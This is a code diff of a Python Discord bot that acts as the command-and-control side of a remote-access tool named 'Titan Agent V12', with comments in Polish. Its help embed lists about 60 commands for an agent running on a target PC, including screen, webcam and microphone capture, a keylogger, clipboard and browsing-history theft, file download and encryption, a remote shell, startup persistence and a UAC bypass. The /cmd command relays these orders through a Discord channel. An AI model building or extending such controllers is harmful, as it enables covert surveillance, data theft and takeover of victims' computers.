@@ -1,41 +1,37 @@
 import discord
 from discord import app_commands
 from discord.ext import commands
-
-# Hosting pobiera token z zmiennych środowiskowych (bezpiecznie)
 import os
-TOKEN = os.getenv("DISCORD_TOKEN") 
 
-class TitanBot(commands.Bot):
+# Pobieranie tokenu z Environment Variables hostingu
+TOKEN = os.getenv("DISCORD_TOKEN")
+
+class HostingBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.all()
         super().__init__(command_prefix="!", intents=intents)
 
     async def setup_hook(self):
-        # To rejestruje komendy / na serwerze
         await self.tree.sync()
-        print(f"✅ Bot na hostingu gotowy!")
+        print(f"✅ Bot sterujący V12 Online (Token pobrany z hostingu)")
 
-bot = TitanBot()
+bot = HostingBot()
 
-# KOMENDA HELP / INFO
-@bot.tree.command(name="krasnal_info", description="Lista 60 funkcji systemu Titan V12")
+@bot.tree.command(name="krasnal_info", description="Lista 60 funkcji systemu")
 async def krasnal_info(interaction: discord.Interaction):
-    embed = discord.Embed(title="🛡️ KATALOG KOMEND TITAN V12", color=0xFF0000)
-    embed.add_field(name="👁️ Spy (1-10)", value="`scr`, `cam`, `mic`, `clip`, `keyon`, `keyoff`, `vid`, `history`, `active`, `files`", inline=False)
-    embed.add_field(name="⚙️ System (11-20)", value="`info`, `procs`, `kill`, `cpu`, `ram`, `bat`, `uptime`, `drv`, `serv`, `users`", inline=False)
-    embed.add_field(name="📂 Files (21-30)", value="`ls`, `cd`, `get`, `put`, `rm`, `mkdir`, `enc`, `dec`, `find`, `size`", inline=False)
-    embed.add_field(name="🌐 Network (31-40)", value="`ip`, `lip`, `wifi`, `ping`, `dns`, `ports`, `netstat`, `mac`, `hosts`, `web`", inline=False)
-    embed.add_field(name="🎭 Troll (41-50)", value="`msg`, `rotate`, `drunk`, `hide`, `show`, `eject`, `wp`, `calc`, `min`, `black`", inline=False)
-    embed.add_field(name="💀 Admin (51-60)", value="`autoon`, `autooff`, `shell`, `ps`, `taskadd`, `taskrm`, `uac`, `off`, `reboot`, `self_destruct`", inline=False)
-    embed.set_footer(text="Użyj /cmd [nazwa] aby wywołać akcję")
+    embed = discord.Embed(title="🛡️ TITAN AGENT V12 - KATALOG", color=0xFF0000)
+    embed.add_field(name="👁️ Spy", value="`scr, cam, mic, clip, vid, keyon, keyoff, active, history, files`", inline=False)
+    embed.add_field(name="⚙️ System", value="`info, procs, kill, shell, cpu, ram, bat, uptime, drv, serv`", inline=False)
+    embed.add_field(name="🎭 Troll", value="`drunk, msg, hide, show, calc, eject, wp, beep, min, black`", inline=False)
+    embed.add_field(name="🌐 Network", value="`ip, lip, wifi, ping, dns, ports, netstat, mac, hosts, web`", inline=False)
+    embed.add_field(name="📂 Files", value="`ls, cd, get, put, rm, mkdir, enc, dec, find, size`", inline=False)
+    embed.add_field(name="💀 Admin", value="`autoon, autooff, ps, taskadd, taskrm, uac, off, reboot, lock, kill_agent`", inline=False)
     await interaction.response.send_message(embed=embed)
 
-# KOMENDA DO WYKONYWANIA
-@bot.tree.command(name="cmd", description="Wykonaj jedną z 60 funkcji")
-@app_commands.describe(akcja="Wpisz kod komendy (np. scr, drunk, autoon)")
+@bot.tree.command(name="cmd", description="Wydaj rozkaz Agentowi")
+@app_commands.describe(akcja="Kod funkcji (np. scr, msg)", parametr="Tekst lub dane")
 async def cmd(interaction: discord.Interaction, akcja: str, parametr: str = ""):
-    # Bot wysyła wiadomość, którą przechwyci Agent na Twoim PC
-    await interaction.response.send_message(f"🚀 WYKONUJĘ: `{akcja}` | Parametr: `{parametr}`")
+    # Wysyła wiadomość, którą przechwyci Agent na Twoim PC
+    await interaction.response.send_message(f"🚀 ROZKAZ: `{akcja.lower()}` | Parametr: `{parametr}`")
 
 bot.run(TOKEN)
